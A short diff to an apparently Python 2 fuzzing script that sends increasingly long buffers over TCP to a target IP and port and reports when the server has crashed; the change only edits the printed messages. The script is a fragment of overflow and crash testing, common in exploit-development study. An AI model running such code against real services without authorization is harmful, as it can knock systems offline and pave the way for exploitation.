@@ -13,7 +13,7 @@ while len(buffer) <=10:
 
 try:
     for culo in buffer:
-        print "\033[;36m"+"Sending %s bytes" % len(culo)
+        print "\033[;36m"+"[***] Sending %s bytes [***]" % len(culo)
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((ip, port))
         s.send(culo + "\r\n")
@@ -21,7 +21,7 @@ try:
         print "\033[;36m"+"OK"
 
 except:
-    print "\033[;36m"+"The server has surely crashed"
+    print "\033[;36m"+"[¡¡¡]The program has surely crashed [!!!]"
     sys.exit(0)
 
 finally:
